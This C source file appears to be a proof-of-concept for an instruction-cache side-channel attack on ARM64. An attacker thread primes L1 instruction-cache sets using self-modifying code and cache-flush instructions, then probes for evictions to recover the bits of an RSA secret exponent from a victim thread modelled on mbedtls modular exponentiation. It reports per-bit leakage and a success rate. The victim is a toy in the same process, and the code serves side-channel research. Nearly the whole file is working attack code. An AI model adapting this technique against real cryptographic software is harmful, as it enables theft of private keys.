#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <semaphore.h>

#include "smc.h"

pthread_t tid0;

void *mem = NULL;
void *mem_victim = NULL;

sem_t prime_sync;
sem_t probe_sync;

int test_array[1024] = {0};
int test_index = 0;

volatile void (*victim_mpi_select)() = NULL;

void print_binary(uint32_t u32)
{
    int i;
    for (i = 0; i < sizeof(u32) * 8; i++)
    {
        if (u32 & (1 << (sizeof(u32) * 8 - 1 - i)))
        {
            printf("1");
        }
        else
        {
            printf("0");
        }
        if (i % 8 == 7)
        {
            printf(" ");
        }
    }
    printf("\n");
}

int victim_rsa_secret[] = {
    0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
    0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
    0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
    0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1};
int victim_rsa_secret_idx = 0;

void *rsa_victim_thread(void *arg)
{
    sem_wait(&prime_sync);
    int state = 1;
    while (1)
    {
        asm volatile(".rept 16\n\tnop\n\t.endr");
        sched_yield();
        // simplify code of mbedtls_mpi_exp_mod
        uint64_t ei = victim_rsa_secret[victim_rsa_secret_idx];
        if (ei == 0 && state == 1)
        {
            victim_mpi_select();
        }
        else
        {
            asm volatile(".rept 4\n\tnop\n\t.endr");
        }
        asm volatile(".rept 16\n\tnop\n\t.endr");
        victim_rsa_secret_idx++;

        test_array[test_index] = 'v';
        test_index++;
        sched_yield();
        asm volatile(".rept 16\n\tnop\n\t.endr");
        test_array[test_index] = 'v';
        test_index++;
    }
    return NULL;
}

void attacker_thread()
{
    // (mbedtls_mpi_read_string(&P, 10, "2789"));
    // (mbedtls_mpi_read_string(&Q, 10, "3203"));
    // (mbedtls_mpi_read_string(&E, 10, "257"));

    unsigned char code[] = {
#if defined(__aarch64__)
        0x00, 0x00, 0x80, 0xd2, // mov x0, #0
        // 0x20, 0x00, 0x80, 0xd2, // mov x0, #1
        0xc0, 0x03, 0x5f, 0xd6, // ret
#endif
    };
    volatile int (*func)();
    volatile int result = 0;
    VirtualAddress va;
    va.address = (uint64_t)mem;
    va.split.tag += 1;
    va.split.index = 0;
    int (*func_list[L1I_SET_NUM][L1I_SET_SIZE])();
    for (int i = 0; i < L1I_SET_NUM; i++)
    {
        VirtualAddress va_way = va;
        for (size_t j = 0; j < L1I_SET_SIZE; j++)
        {
            va_way.split.tag = va_way.split.tag + j;
            func_list[i][j] = (void *)va_way.address;
            memcpy(func_list[i][j], code, sizeof(code));
        }
        va.split.index++;
    }
    va.address = (uint64_t)mem_victim;
    va.split.tag += 1;
    va.split.index = 0;
    victim_mpi_select = (void *)va.address;
    memcpy(victim_mpi_select, code, sizeof(code));

    int count[L1I_SET_NUM][L1I_SET_SIZE], sum = 9;
    memset(count, 0, sizeof(count));
    int tested_len = 32;
    int tested_set_record[1024][L1I_SET_SIZE] = {0};
    int tested_set_valid[1024] = {0};
    memset(tested_set_record, 0, sizeof(tested_set_record));

    sem_post(&prime_sync);
    for (size_t i = 0; i < tested_len; i++)
    {
        // call
        for (int j = 0; j < 1; j++)
        {
            for (size_t k = 0; k < L1I_SET_SIZE; k++)
            {
                func = func_list[j][k];
                func();
            }
        }
        asm volatile("ic ivau, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        asm volatile("dc civac, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        // modify
        for (int j = 0; j < 1; j++)
        {
            for (size_t k = 0; k < L1I_SET_SIZE; k++)
            {
                func = func_list[j][k];
                ((uint8_t *)func)[0] = 0x20;
            }
        }
        asm volatile("ic ivau, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        asm volatile("dc civac, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        // printf("at -\n");
        test_array[test_index] = 'b';
        test_index++;

        sched_yield();
        // // debug the ghostcache
        // if (victim_rsa_secret[victim_rsa_secret_idx])
        // {
        //     victim_mpi_select();
        // }
        // victim_rsa_secret_idx++;

        // printf("at =\n");
        test_array[test_index] = 'a';
        test_index++;
        // recall
        for (int j = 0; j < 1; j++)
        {
            // for (size_t k = 0; k < L1I_SET_SIZE; k++)
            for (int k = L1I_SET_SIZE - 1; k >= 0; k--)
            {
                func = func_list[j][k];
                int result = func();
                tested_set_record[i][k] = result;
                if (result == 1)
                {
                    func = func_list[j][k];
                    ((uint8_t *)func)[0] = 0x0;
                    asm volatile("ic ivau, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)func) : "memory");
                    count[j][k]++;
                }
                if (test_array[test_index - 2] == 'v')
                {
                    tested_set_valid[i] = 1;
                }
            }
        }
        asm volatile("ic ivau, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        asm volatile("dc civac, %0\n\tisb sy\n\tisb sy\n\t" ::"r"((uint64_t)victim_mpi_select) : "memory");
        sched_yield();
    }
    for (int j = 0; j < test_index; j++)
    {
        printf("%c ", test_array[j]);
    }
    printf("\n");
    int success_num = 0;
    for (int j = 0; j < tested_len; j++)
    {
        int success = 0;
        int sum = tested_set_record[j][0] + tested_set_record[j][1] + tested_set_record[j][2] + tested_set_record[j][3];
        printf("leakage %3d:", j);

        if (victim_rsa_secret[j])
        {
            if (sum > 2)
            {
                success++;
            }
        }
        else
        {
            if (sum <= 2)
            {
                success++;
            }
        }
        printf("secret: %d, valid: %d, sum: %2d, success: %d. ",
               victim_rsa_secret[j],
               tested_set_valid[j],
               sum,
               success);
        printf(" $ evicted: [");
        for (int k = 0; k < L1I_SET_SIZE; k++)
        {
            printf("%d ", tested_set_record[j][k]);
        }
        printf("] ");
        for (int i = 0; i < sum; i++)
        {
            printf("#");
        }
        success_num = success_num + success;
        printf("\n");
    }
    printf("success: %d, success rate: %.2f%%\n",
           success_num, (float)success_num / tested_len * 100);
}

int main(int argc, char const *argv[])
{
    sem_init(&prime_sync, 0, 0);
    sem_init(&probe_sync, 0, 0);

    long page_size = sysconf(_SC_PAGESIZE);
    mem = mmap(NULL, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mprotect(mem, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC);
    mem_victim = mmap(NULL, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mprotect(mem_victim, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC);

    pthread_create(&tid0, NULL, rsa_victim_thread, NULL);
    sleep(1);
    attacker_thread();

    munmap(mem, page_size * 32);

    sem_destroy(&prime_sync);
    sem_destroy(&probe_sync);
    return 0;
}
